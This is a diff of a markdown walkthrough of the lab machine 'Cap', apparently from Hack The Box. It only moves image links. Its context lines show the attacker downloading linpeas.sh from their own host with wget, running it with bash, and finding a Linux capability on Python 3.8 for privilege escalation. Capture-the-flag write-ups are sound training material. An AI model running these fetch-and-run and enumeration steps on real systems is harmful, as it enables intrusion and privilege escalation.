@@ -177,11 +177,13 @@ nathan@cap:/tmp$ wget http://<my-ip>/linpeas.sh
 nathan@cap:/tmp$ bash linpeas.sh
 ```
 
+![cap](/static/images/cap/image%204.png)
+
 ## What LinPEAS Found
 
 LinPEAS flagged an interesting Linux **capability** assigned directly to the Python 3.8 binary.
 
-![cap](/static/images/cap/image%204.png)
+![cap](/static/images/cap/image%205.png)
 
 I confirmed it manually with `getcap`, a tool that lists any special capabilities attached to a binary:
 
